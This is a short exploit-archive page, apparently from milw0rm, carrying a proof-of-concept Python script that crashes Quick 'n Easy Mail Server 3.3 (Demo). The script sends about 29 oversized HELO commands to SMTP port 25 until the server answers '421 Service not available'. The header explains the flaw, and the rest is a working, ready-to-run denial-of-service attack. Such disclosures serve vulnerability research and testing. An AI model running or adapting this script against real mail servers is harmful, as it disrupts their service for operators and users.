<html><head><title>Quick 'n Easy Mail Server 3.3 (Demo) Remote Denial of Service PoC</title></head><pre># ---------------------------------------------------------------
# Quick 'n Easy Mail Server 3.3 (Demo) Remote Denial of Service
# http://www.pablosoftwaresolutions.com/

# author: shinnai
# mail: shinnai[at]autistici[dot]org
# site: http://www.shinnai.net/

# When you pass a long string to the server, it checks for bof
# type attacks and answers with a:
# &quot;&lt;SMTP&gt; Buffer overflow: DOS attack?&quot;
# after 25 requests (more or less), server is unable to handle
# errors.
# An attacker can exploit this issue to trigger dos conditions.
# In case of succesful exploitation of this vulnerability,
# the server will answer to requests as below:
# &quot;&lt;SMTP&gt; 421 Service not available&quot;
#---------------------------------------------------------------&quot;

import socket

try:
   for i in range(1,30):
      s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
      conn = s.connect((&quot;127.0.0.1&quot;,25))
      s.send('HELO ' + &quot;AAA@AAAAAA.COM&quot; * 4000 + '\r\n')
      d = s.recv(1024)
      print d
      s.close
   raw_input(&quot;Done. If server is still available, try to increase the number of requests.\n\nPress enter to quit...&quot;)
except:
   raw_input(&quot;Unable to connect!\n\nPress enter to quit...&quot;)

# milw0rm.com [2009-05-04]</pre></html>